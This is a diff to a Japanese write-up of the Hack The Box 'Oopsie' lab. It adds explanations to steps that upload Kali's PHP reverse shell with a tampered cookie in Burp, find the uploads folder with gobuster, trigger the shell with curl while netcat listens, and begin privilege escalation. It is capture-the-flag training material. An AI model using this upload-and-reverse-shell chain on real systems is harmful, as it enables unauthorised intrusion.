@@ -62,20 +62,20 @@ Kaliにデフォルトで格納されているphp reverse shellをコピーし�
 # cp /usr/share/webshells/php/php-reverse-shell.php ./test.php
 ```
 
-test.phpの中身のipアドレスを自身のアドレス($ hostname -I コマンドの10.0.X.Xで始まるアドレス)とポート番号に変更する．
+このphpファイルは，実行すれば攻撃対象のマシンからセッションの接続の要求をしてくれるリバースシェルの役割がある．
+test.phpの中身のipアドレスを自身のアドレス($ hostname -I コマンドの10.0.X.Xで始まるアドレス)とポート番号（ここでは1234）に変更する．
 編集後のphpファイルを先ほどのアップロードページに送信する．
 この時，プロキシはインターセプト（Proxy->Intercept->Intercept On）にする．
 そして以下のように先ほどのcookieに変更してSendを送信する．
 
 ![IDの変更](./pictures/Oopsie/p3.png "Burp3")
 
+以下の図のようにリクエストが200になって返ってくればアップロードは成功と思われる．
 
 ![IDの変更](./pictures/Oopsie/p4.png "Burp4")
 
-
-
-
 ### 3. セッションの確立
+次にアップロードされたファイルがどこにあるかを探す必要がある．
 gobusterにより，サイトに隠れたディレクトリがないかを調べる．
 
 ```
@@ -113,13 +113,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 uploadというフォルダが確認でき，先ほどアップロードしたファイルが存在すると予測される．
 そこでnetcat（nc）コマンドでリッスンをして置き，phpファイルを実行してセッションを確立する．
-実行はcurlコマンドでphpファイルにアクセスしてあげることにより，することができる．
-
-```
-$ curl http://10.10.10.28/uploads/test.php
-```
-
 別の端末でncコマンドを実行する．
+ncコマンドは先ほどのphpファイルに指定したポート番号と同じにする．
 
 ```
 ┌──(kali㉿kali)-[~/Documents/htb/starting_point]
@@ -133,10 +128,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 ```
 
-セッションを確立後，ユーザのホームディレクトリを見るとflagの取得ができる．
+実行はcurlコマンドでphpファイルにアクセスしてあげることにより，することができる．
 
+```
+$ curl http://10.10.10.28/uploads/test.php
+```
+
+セッションを確立後，ユーザのホームディレクトリを見るとflagの取得ができる（ncコマンドを立ち上げたターミナルがいじれるようになる）．
 
 ### 4. 権限昇格
+権限昇格につながるようなファイルを探す．
+
 ```
 $ ls /var/www/html/cdn-cgi/login
 admin.php
